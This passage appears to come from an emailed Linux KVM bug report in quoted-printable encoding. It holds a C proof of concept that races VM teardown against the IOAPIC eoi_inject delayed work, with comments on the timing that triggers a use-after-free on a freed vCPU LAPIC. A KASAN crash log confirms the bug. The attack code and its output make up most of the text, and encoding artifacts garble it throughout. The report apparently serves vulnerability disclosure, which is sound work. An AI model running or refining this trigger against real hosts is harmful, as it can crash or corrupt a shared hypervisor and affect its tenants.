=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 struct kvm_regs rg; ioctl(vm=
->vcpu_fd[0], KVM_GET_REGS, &rg);
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 fprintf(stderr, "[dbg] exit=
=3D%u rip=3D%#llx cnt=3D%u",
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 =
run->exit_reason, (unsigned long long)rg.rip,
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 =
*(volatile uint32_t *)(vm->mem + COUNTER_GPA));
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 if (run->exit_reason =3D=3D =
KVM_EXIT_IO)
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 fprintf(stderr=
, " io.port=3D%#x dir=3D%u", run->io.port, run->io.direction);
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 if (run->exit_reason =3D=3D =
KVM_EXIT_INTERNAL_ERROR)
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 fprintf(stderr=
, " suberr=3D%u", run->internal.suberror);
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 if (run->exit_reason =3D=3D =
KVM_EXIT_FAIL_ENTRY)
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 fprintf(stderr=
, " hw=3D%#llx",
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=
 =C2=A0=C2=A0 (unsigned long long)run->fail_entry.hardware_entry_failure_re=
ason);
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 fprintf(stderr, "\n");
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 }
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 switch (run->exit_reason) {
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 case KVM_EXIT_IO:
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 if (run->io.port =3D=3D 0xF4=
) { =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 // guest says "work armed"
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 g_armed =3D 1;
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 return NULL;
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 }
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 break; =C2=A0 =C2=A0 =C2=A0 =
=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 // ignore any other port
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 case KVM_EXIT_HLT:
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 return NULL;
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 case KVM_EXIT_SHUTDOWN:
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 case KVM_EXIT_FAIL_ENTRY:
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 case KVM_EXIT_INTERNAL_ERROR:
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 // Typically: host lacks "un=
restricted guest" for unpaged PM,
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 // or a setup bug. Report on=
ce from main via g_armed staying 0.
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 return NULL;
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 default:
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 break; =C2=A0 =C2=A0 =C2=A0 =
=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 // MMIO shouldn't occur (in-kernel devs)
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 }
=C2=A0=C2=A0=C2=A0 }
}

// Create a fresh VM, arm the delayed work, race the teardown against it.
// Returns 1 if the work was armed (iteration "counted"), 0 otherwise.
static int run_iteration(int nvcpu, useconds_t sleep_us)
{
=C2=A0=C2=A0=C2=A0 struct vm vm;
=C2=A0=C2=A0=C2=A0 memset(&vm, 0, sizeof(vm));
=C2=A0=C2=A0=C2=A0 vm.nvcpu =3D nvcpu;

=C2=A0=C2=A0=C2=A0 vm.vm_fd =3D ioctl(kvm_fd, KVM_CREATE_VM, 0);
=C2=A0=C2=A0=C2=A0 if (vm.vm_fd < 0) die("KVM_CREATE_VM");

=C2=A0=C2=A0=C2=A0 // Intel needs a TSS region for the (unpaged) guest; har=
mless elsewhere.
=C2=A0=C2=A0=C2=A0 ioctl(vm.vm_fd, KVM_SET_TSS_ADDR, 0xfffbd000);

=C2=A0=C2=A0=C2=A0 // In-kernel PIC + IOAPIC + per-vCPU LAPIC -- the vulner=
able IOAPIC lives here.
=C2=A0=C2=A0=C2=A0 if (ioctl(vm.vm_fd, KVM_CREATE_IRQCHIP, 0) < 0) die("KVM=
_CREATE_IRQCHIP");

=C2=A0=C2=A0=C2=A0 // Guest RAM.
=C2=A0=C2=A0=C2=A0 vm.mem =3D mmap(NULL, GUEST_MEM_SIZE, PROT_READ | PROT_W=
RITE,
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 MAP_PRI=
VATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);
=C2=A0=C2=A0=C2=A0 if (vm.mem =3D=3D MAP_FAILED) die("mmap guest mem");

=C2=A0=C2=A0=C2=A0 struct kvm_userspace_memory_region region =3D {
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 .slot =3D 0,
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 .guest_phys_addr =3D 0,
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 .memory_size =3D GUEST_MEM_SIZE,
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 .userspace_addr =3D (uint64_t)vm.mem,
=C2=A0=C2=A0=C2=A0 };
=C2=A0=C2=A0=C2=A0 if (ioctl(vm.vm_fd, KVM_SET_USER_MEMORY_REGION, &region)=
 < 0)
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 die("KVM_SET_USER_MEMORY_REGION");

=C2=A0=C2=A0=C2=A0 setup_guest_memory(&vm);

=C2=A0=C2=A0=C2=A0 // Create N vCPUs. Only vCPU0 runs; the rest exist to wi=
den the teardown
=C2=A0=C2=A0=C2=A0 // window in kvm_destroy_vcpus() (more LAPICs to free be=
fore the cancel).
=C2=A0=C2=A0=C2=A0 vm.vcpu_fd =3D calloc(nvcpu, sizeof(int));
=C2=A0=C2=A0=C2=A0 for (int i =3D 0; i < nvcpu; i++) {
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 vm.vcpu_fd[i] =3D ioctl(vm.vm_fd, KVM_CREA=
TE_VCPU, i);
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 if (vm.vcpu_fd[i] < 0) die("KVM_CREATE_VCP=
U");
=C2=A0=C2=A0=C2=A0 }

=C2=A0=C2=A0=C2=A0 vm.run0_sz =3D ioctl(kvm_fd, KVM_GET_VCPU_MMAP_SIZE, 0);
=C2=A0=C2=A0=C2=A0 vm.run0 =3D mmap(NULL, vm.run0_sz, PROT_READ | PROT_WRIT=
E,
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 MAP_SH=
ARED, vm.vcpu_fd[0], 0);
=C2=A0=C2=A0=C2=A0 if (vm.run0 =3D=3D MAP_FAILED) die("mmap kvm_run");

=C2=A0=C2=A0=C2=A0 setup_vcpu0_regs(&vm);

=C2=A0=C2=A0=C2=A0 // Assert the level-triggered line and keep it high (nev=
er deasserted).
=C2=A0=C2=A0=C2=A0 struct kvm_irq_level lvl =3D { .irq =3D IOAPIC_PIN, .lev=
el =3D 1 };
=C2=A0=C2=A0=C2=A0 if (ioctl(vm.vm_fd, KVM_IRQ_LINE, &lvl) < 0) die("KVM_IR=
Q_LINE");

=C2=A0=C2=A0=C2=A0 // Run vCPU0 until it arms the work and signals us.
=C2=A0=C2=A0=C2=A0 g_armed =3D 0;
=C2=A0=C2=A0=C2=A0 g_stop =3D 0;
=C2=A0=C2=A0=C2=A0 pthread_t th;
=C2=A0=C2=A0=C2=A0 pthread_create(&th, NULL, vcpu0_thread, &vm);

=C2=A0=C2=A0=C2=A0 // Wait (bounded) for arming.
=C2=A0=C2=A0=C2=A0 struct timespec deadline;
=C2=A0=C2=A0=C2=A0 clock_gettime(CLOCK_REALTIME, &deadline);
=C2=A0=C2=A0=C2=A0 long arm_timeout_ms =3D getenv("POC_ARM_TIMEOUT_MS") ?
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=
 =C2=A0 =C2=A0=C2=A0 atol(getenv("POC_ARM_TIMEOUT_MS")) : 500;
=C2=A0=C2=A0=C2=A0 if (arm_timeout_ms < 1)
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 arm_timeout_ms =3D 1;
=C2=A0=C2=A0=C2=A0 deadline.tv_sec +=3D arm_timeout_ms / 1000;
=C2=A0=C2=A0=C2=A0 deadline.tv_nsec +=3D (arm_timeout_ms % 1000) * 1000 * 1=
000;
=C2=A0=C2=A0=C2=A0 while (deadline.tv_nsec >=3D 1000000000) {
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 deadline.tv_sec++;
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 deadline.tv_nsec -=3D 1000000000;
=C2=A0=C2=A0=C2=A0 }
=C2=A0=C2=A0=C2=A0 if (pthread_timedjoin_np(th, NULL, &deadline) !=3D 0) {
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 // vCPU stuck (host without unrestricted-g=
uest? APIC issue). Bail out.
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 g_stop =3D 1;
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 pthread_kill(th, SIGUSR1);
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 pthread_join(th, NULL);
=C2=A0=C2=A0=C2=A0 }

=C2=A0=C2=A0=C2=A0 int armed =3D g_armed;

=C2=A0=C2=A0=C2=A0 int tfd =3D -1, mfd =3D -1;
=C2=A0=C2=A0=C2=A0 if (getenv("POC_TRACE_ON")) {
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 tfd =3D open("/sys/kernel/tracing/tracing_=
on", O_WRONLY);
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 if (tfd >=3D 0) { if (write(tfd, "1", 1) <=
 0) {/*ignore*/} }
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 mfd =3D open("/sys/kernel/tracing/trace_ma=
rker", O_WRONLY);
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 if (mfd >=3D 0) { if (write(mfd, "POC_ARME=
D", 9) < 0) {/*ignore*/} }
=C2=A0=C2=A0=C2=A0 }

=C2=A0=C2=A0=C2=A0 // The work will fire ~10ms after arming. Sleep so that =
our destroy lands
=C2=A0=C2=A0=C2=A0 // right as the timer expires -> kvm_destroy_vcpus() fre=
es LAPICs while the
=C2=A0=C2=A0=C2=A0 // work executes -> use-after-free.
=C2=A0=C2=A0=C2=A0 if (armed)
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 usleep(sleep_us);

=C2=A0=C2=A0=C2=A0 // ---- teardown (triggers kvm_destroy_vm -> the racy pa=
th) ----
=C2=A0=C2=A0=C2=A0 struct timespec t0, t1;
=C2=A0=C2=A0=C2=A0 if (dbg) clock_gettime(CLOCK_MONOTONIC, &t0);
=C2=A0=C2=A0=C2=A0 munmap(vm.run0, vm.run0_sz);
=C2=A0=C2=A0=C2=A0 for (int i =3D 0; i < nvcpu; i++)
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 close(vm.vcpu_fd[i]); =C2=A0 =C2=A0 =C2=A0=
 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 // drop per-vCPU kvm refer=
ences
=C2=A0=C2=A0=C2=A0 munmap(vm.mem, GUEST_MEM_SIZE);
=C2=A0=C2=A0=C2=A0 if (mfd >=3D 0) { if (write(mfd, "POC_CLOSE_VM", 12) < 0=
) {/*ignore*/} }
=C2=A0=C2=A0=C2=A0 close(vm.vm_fd); =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 // last ref -> =
destroy runs here
=C2=A0=C2=A0=C2=A0 if (mfd >=3D 0) { if (write(mfd, "POC_CLOSED", 10) < 0) =
{/*ignore*/} close(mfd); }
=C2=A0=C2=A0=C2=A0 if (tfd >=3D 0) { if (write(tfd, "0", 1) < 0) {/*ignore*=
/} close(tfd); }
=C2=A0=C2=A0=C2=A0 if (dbg) {
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 clock_gettime(CLOCK_MONOTONIC, &t1);
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 long us =3D (t1.tv_sec - t0.tv_sec) * 1000=
000L + (t1.tv_nsec - t0.tv_nsec) / 1000;
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 fprintf(stderr, "[dbg] teardown(nvcpu=3D%d=
) =3D %ld us=C2=A0 (sleep was %u us)\n",
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 nvcpu, us, sle=
ep_us);
=C2=A0=C2=A0=C2=A0 }
=C2=A0=C2=A0=C2=A0 free(vm.vcpu_fd);

=C2=A0=C2=A0=C2=A0 return armed;
}

int main(void)
{
=C2=A0=C2=A0=C2=A0 // Defaults are the empirically-confirmed sweet spot on =
a HZ=3D1000 KASAN
=C2=A0=C2=A0=C2=A0 // kernel: ~32 vCPUs makes kvm_destroy_vcpus() free vCPU=
0 at ~CLOSE+7ms and
=C2=A0=C2=A0=C2=A0 // reach kvm_ioapic_destroy() (the cancel) at ~CLOSE+10m=
s, straddling the
=C2=A0=C2=A0=C2=A0 // work's ~10ms fire time -> the work delivers to the ju=
st-freed vCPU0.
=C2=A0=C2=A0=C2=A0 long iters =C2=A0 =3D getenv("POC_ITERS") =C2=A0 ? atol(=
getenv("POC_ITERS")) =C2=A0 : 200000;
=C2=A0=C2=A0=C2=A0 int=C2=A0 nvcpu =C2=A0 =3D getenv("POC_NVCPU") =C2=A0 ? =
atoi(getenv("POC_NVCPU")) =C2=A0 : 32;
=C2=A0=C2=A0=C2=A0 long base_us =3D getenv("POC_SLEEP_US")? atol(getenv("PO=
C_SLEEP_US")): 0;

=C2=A0=C2=A0=C2=A0 if (nvcpu < 1) nvcpu =3D 1;
=C2=A0=C2=A0=C2=A0 dbg =3D getenv("POC_DEBUG") ? atoi(getenv("POC_DEBUG")) =
: 0;

=C2=A0=C2=A0=C2=A0 // A noop SIGUSR1 handler (no SA_RESTART) so pthread_kil=
l() can EINTR a
=C2=A0=C2=A0=C2=A0 // stuck KVM_RUN in the vCPU thread.
=C2=A0=C2=A0=C2=A0 struct sigaction s;
=C2=A0=C2=A0=C2=A0 memset(&s, 0, sizeof(s));
=C2=A0=C2=A0=C2=A0 s.sa_handler =3D noop_handler;
=C2=A0=C2=A0=C2=A0 s.sa_flags =3D 0;
=C2=A0=C2=A0=C2=A0 sigaction(SIGUSR1, &s, NULL);

=C2=A0=C2=A0=C2=A0 kvm_fd =3D open("/dev/kvm", O_RDWR | O_CLOEXEC);
=C2=A0=C2=A0=C2=A0 if (kvm_fd < 0) die("open /dev/kvm");

=C2=A0=C2=A0=C2=A0 int api =3D ioctl(kvm_fd, KVM_GET_API_VERSION, 0);
=C2=A0=C2=A0=C2=A0 if (api !=3D KVM_API_VERSION) { fprintf(stderr, "KVM API=
 %d\n", api); return 1; }

=C2=A0=C2=A0=C2=A0 fprintf(stderr,
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 "[*] IOAPIC eoi_inject UAF race: iters=3D%=
ld nvcpu=3D%d base_sleep=3D%ldus\n"
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 "[*] Needs a KASAN guest kernel to *observ=
e* the UAF. Ctrl-C to stop.\n",
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 iters, nvcpu, base_us);

=C2=A0=C2=A0=C2=A0 long armed_ok =3D 0;
=C2=A0=C2=A0=C2=A0 for (long i =3D 0; i < iters; i++) {
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 // Start teardown ASAP (tiny sleep) so kvm=
_destroy_vcpus() frees the
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 // target LAPIC (vCPU0, freed first, withi=
n ~100us) BEFORE the eoi_inject
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 // timer fires. With many vCPUs the free l=
oop lasts many ms, so
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 // kvm_ioapic_destroy() (which cancels the=
 work) is reached only long
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 // after the timer fires -> the work deliv=
ers to freed vCPU0 -> UAF.
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 useconds_t sleep_us =3D (useconds_t)(base_=
us + (i % 1500)); =C2=A0 // ~0 .. 1.5 ms
=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 armed_ok +=3D run_iteration(nvcpu, sleep_u=
s);

=C2=A0=C2=A0 =C2=A0 =C2=A0=C2=A0 if ((i % 500) =3D=3D 0)
=C2=A0=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 fprintf(stderr, "\r[*] iter=
=3D%ld armed=3D%ld =C2=A0 ", i, armed_ok);
=C2=A0=C2=A0=C2=A0 }
=C2=A0=C2=A0=C2=A0 fprintf(stderr, "\n[*] done (no crash observed in %ld it=
ers)\n", iters);
=C2=A0=C2=A0=C2=A0 return 0;
}

// Separate TU-visible noop so -O2 can't fold it away in a surprising manne=
r.
void noop_handler(int sig) { (void)sig; }
```

crash log

```
/ # POC_ITERS=3D100 POC_NVCPU=3D64 POC_ARM_TIMEOUT_MS=3D15000 POC_SLEEP_US=
=3D10000 /bin/kvm-x86-poc
[*] IOAPIC eoi_inject UAF race: iters=3D100 nvcpu=3D64 base_sleep=3D10000us
[*] Needs a KASAN guest kernel to *observe* the UAF. Ctrl-C to stop.
[*] iter=3D0 armed=3D1 =C2=A0 [ =C2=A0 50.773111] =3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D
[ =C2=A0 50.775501] BUG: KASAN: slab-use-after-free in __kvm_irq_delivery_t=
o_apic_fast+0x29f/0x3e0 [kvm]
[ =C2=A0 50.778186] Read of size 8 at addr ff1100010a2906a0 by task kworker=
/3:1/47
[ =C2=A0 50.778450]
[ =C2=A0 50.779189] CPU: 3 UID: 0 PID: 47 Comm: kworker/3:1 Not tainted 7.2=
.0-rc1 #1 PREEMPT(lazy)
[ =C2=A0 50.779420] Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIO=
S 1.16.2-debian-1.16.2-1 04/01/2014
[ =C2=A0 50.779572] Workqueue: events kvm_ioapic_eoi_inject_work [kvm]
[ =C2=A0 50.781876] Call Trace:
[ =C2=A0 50.781950]=C2=A0 <TASK>
[ =C2=A0 50.782031]=C2=A0 dump_stack_lvl+0x5f/0x80
[ =C2=A0 50.782382]=C2=A0 print_report+0xd1/0x5d0
[ =C2=A0 50.782441]=C2=A0 ? __virt_addr_valid+0xf1/0x1a0
[ =C2=A0 50.782489]=C2=A0 ? kasan_complete_mode_report_info+0x80/0x210
[ =C2=A0 50.782541]=C2=A0 kasan_report+0xeb/0x120
[ =C2=A0 50.782605]=C2=A0 ? __kvm_irq_delivery_to_apic_fast+0x29f/0x3e0 [kv=
m]
[ =C2=A0 50.784322]=C2=A0 ? __kvm_irq_delivery_to_apic_fast+0x29f/0x3e0 [kv=
m]
[ =C2=A0 50.786015]=C2=A0 __asan_load8+0x82/0xb0
[ =C2=A0 50.786101]=C2=A0 __kvm_irq_delivery_to_apic_fast+0x29f/0x3e0 [kvm]
[ =C2=A0 50.787814]=C2=A0 ? __pfx___kvm_irq_delivery_to_apic_fast+0x10/0x10=
 [kvm]
[ =C2=A0 50.789532]=C2=A0 ? ktime_get+0x70/0x110
[ =C2=A0 50.789600]=C2=A0 ? lapic_next_event+0x14/0x20
[ =C2=A0 50.789649]=C2=A0 ? clockevents_program_event+0x1cd/0x410
[ =C2=A0 50.789704]=C2=A0 __kvm_irq_delivery_to_apic+0xc7/0x5d0 [kvm]
[ =C2=A0 50.791399]=C2=A0 ? __kasan_check_write+0x18/0x20
[ =C2=A0 50.791449]=C2=A0 ? __update_load_avg_cfs_rq+0x2db/0x5e0
[ =C2=A0 50.791492]=C2=A0 ? cpuacct_charge+0x8b/0xb0
[ =C2=A0 50.791536]=C2=A0 ? __pfx___kvm_irq_delivery_to_apic+0x10/0x10 [kvm=
]
[ =C2=A0 50.793217]=C2=A0 ? pick_eevdf+0x2f9/0x330
[ =C2=A0 50.793268]=C2=A0 ? rb_insert_color+0x183/0x2a0
[ =C2=A0 50.793337]=C2=A0 ioapic_service+0x291/0x2c0 [kvm]
[ =C2=A0 50.795009]=C2=A0 ? __pfx_ioapic_service+0x10/0x10 [kvm]
[ =C2=A0 50.796697]=C2=A0 ? __pfx__raw_spin_lock+0x10/0x10
[ =C2=A0 50.796752]=C2=A0 kvm_ioapic_eoi_inject_work+0xaa/0xd0 [kvm]
[ =C2=A0 50.798437]=C2=A0 process_one_work+0x373/0x710
[ =C2=A0 50.798505]=C2=A0 worker_thread+0x284/0x4d0
[ =C2=A0 50.798560]=C2=A0 ? __pfx_worker_thread+0x10/0x10
[ =C2=A0 50.798607]=C2=A0 kthread+0x1b9/0x200
[ =C2=A0 50.798670]=C2=A0 ? __pfx_kthread+0x10/0x10
[ =C2=A0 50.798709]=C2=A0 ret_from_fork+0x2b8/0x490
[ =C2=A0 50.798753]=C2=A0 ? __pfx_ret_from_fork+0x10/0x10
[ =C2=A0 50.798794]=C2=A0 ? __asan_storeN+0x16/0x20
[ =C2=A0 50.798833]=C2=A0 ? __switch_to+0x2fb/0x720
[ =C2=A0 50.798878]=C2=A0 ? __pfx_kthread+0x10/0x10
[ =C2=A0 50.798920]=C2=A0 ret_from_fork_asm+0x1a/0x30
[ =C2=A0 50.799004]=C2=A0 </TASK>
[ =C2=A0 50.799081]
[ =C2=A0 50.803914] Allocated by task 109 on cpu 1 at 48.240120s:
[ =C2=A0 50.804161]=C2=A0 kasan_save_stack+0x3d/0x60
[ =C2=A0 50.804408]=C2=A0 kasan_save_track+0x1c/0x70
[ =C2=A0 50.804559]=C2=A0 kasan_save_alloc_info+0x3b/0x50
[ =C2=A0 50.804750]=C2=A0 __kasan_kmalloc+0x9c/0xa0
[ =C2=A0 50.804888]=C2=A0 __kmalloc_cache_noprof+0x162/0x3a0
[ =C2=A0 50.805040]=C2=A0 kvm_create_lapic+0x59/0x230 [kvm]
[ =C2=A0 50.806856]=C2=A0 kvm_arch_vcpu_create+0x102/0x4d0 [kvm]
[ =C2=A0 50.808719]=C2=A0 kvm_vm_ioctl+0xa82/0x18b0 [kvm]
[ =C2=A0 50.810483]=C2=A0 __x64_sys_ioctl+0xcc/0x120
[ =C2=A0 50.810670]=C2=A0 x64_sys_call+0xa79/0x2010
[ =C2=A0 50.810815]=C2=A0 do_syscall_64+0x102/0x5e0
[ =C2=A0 50.810956]=C2=A0 entry_SYSCALL_64_after_hwframe+0x77/0x7f
[ =C2=A0 50.811144]
[ =C2=A0 50.811236] Freed by task 109 on cpu 2 at 50.771569s:
[ =C2=A0 50.811400]=C2=A0 kasan_save_stack+0x3d/0x60
[ =C2=A0 50.811549]=C2=A0 kasan_save_track+0x1c/0x70
[ =C2=A0 50.811711]=C2=A0 kasan_save_free_info+0x3f/0x60
[ =C2=A0 50.811868]=C2=A0 __kasan_slab_free+0x48/0x70
[ =C2=A0 50.812020]=C2=A0 kfree+0x131/0x390
[ =C2=A0 50.812144]=C2=A0 kvm_free_lapic+0x88/0xe0 [kvm]
[ =C2=A0 50.813936]=C2=A0 kvm_arch_vcpu_destroy+0x15e/0x1f0 [kvm]
[ =C2=A0 50.815728]=C2=A0 kvm_destroy_vcpus+0x19b/0x250 [kvm]
[ =C2=A0 50.817491]=C2=A0 kvm_arch_destroy_vm+0x62/0x190 [kvm]
[ =C2=A0 50.819274]=C2=A0 kvm_put_kvm+0x2b4/0x500 [kvm]
[ =C2=A0 50.821024]=C2=A0 kvm_vm_release+0x29/0x40 [kvm]
[ =C2=A0 50.822798]=C2=A0 __fput+0x1d3/0x4a0
[ =C2=A0 50.822926]=C2=A0 fput_close_sync+0xcc/0x170
[ =C2=A0 50.823068]=C2=A0 __x64_sys_close+0x57/0xa0
[ =C2=A0 50.823196]=C2=A0 x64_sys_call+0x17bc/0x2010
[ =C2=A0 50.823338]=C2=A0 do_syscall_64+0x102/0x5e0
[ =C2=A0 50.823466]=C2=A0 entry_SYSCALL_64_after_hwframe+0x77/0x7f
[ =C2=A0 50.823696]
[ =C2=A0 50.823804] The buggy address belongs to the object at ff1100010a29=
0600
[ =C2=A0 50.823804]=C2=A0 which belongs to the cache kmalloc-256 of size 25=
6
[ =C2=A0 50.824173] The buggy address is located 160 bytes inside of
[ =C2=A0 50.824173]=C2=A0 freed 256-byte region [ff1100010a290600, ff110001=
0a290700)
[ =C2=A0 50.824512]
[ =C2=A0 50.824655] The buggy address belongs to the physical page:
[ =C2=A0 50.825094] page: refcount:0 mapcount:0 mapping:0000000000000000 in=
dex:0x0 pfn:0x10a290
[ =C2=A0 50.825495] head: order:1 mapcount:0 entire_mapcount:0 nr_pages_map=
ped:0 pincount:0
[ =C2=A0 50.825802] flags: 0x200000000000040(head|node=3D0|zone=3D2)
[ =C2=A0 50.826261] page_type: f5(slab)
[ =C2=A0 50.826617] raw: 0200000000000040 ff11000100038b40 dead000000000100=
 dead000000000122
[ =C2=A0 50.826842] raw: 0000000000000000 0000000000100010 00000000f5000000=
 0000000000000000
[ =C2=A0 50.827110] head: 0200000000000040 ff11000100038b40 dead00000000010=
0 dead000000000122
[ =C2=A0 50.827333] head: 0000000000000000 0000000000100010 00000000f500000=
0 0000000000000000
[ =C2=A0 50.827560] head: 0200000000000001 ffffffffffffff81 00000000fffffff=
f 00000000ffffffff
[ =C2=A0 50.827817] head: 0000000000000000 0000000000000000 00000000fffffff=
f 0000000000000000
[ =C2=A0 50.828041] page dumped because: kasan: bad access detected
[ =C2=A0 50.828208]
[ =C2=A0 50.828290] Memory state around the buggy address:
[ =C2=A0 50.828605]=C2=A0 ff1100010a290580: fc fc fc fc fc fc fc fc fc fc f=
c fc fc fc fc fc
[ =C2=A0 50.828859]=C2=A0 ff1100010a290600: fa fb fb fb fb fb fb fb fb fb f=
b fb fb fb fb fb
[ =C2=A0 50.829088] >ff1100010a290680: fb fb fb fb fb fb fb fb fb fb fb fb =
fb fb fb fb
[ =C2=A0 50.829309] =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=
 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 ^
[ =C2=A0 50.829487]=C2=A0 ff1100010a290700: fc fc fc fc fc fc fc fc fc fc f=
c fc fc fc fc fc
[ =C2=A0 50.829743]=C2=A0 ff1100010a290780: fc fc fc fc fc fc fc fc fc fc f=
c fc fc fc fc fc
[ =C2=A0 50.829955] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
[ =C2=A0 50.830725] Disabling lock debugging due to kernel taint
```

after decode

```
/ # POC_ITERS=3D100 POC_NVCPU=3D64 POC_ARM_TIMEOUT_MS=3D15000 POC_SLEEP_US=
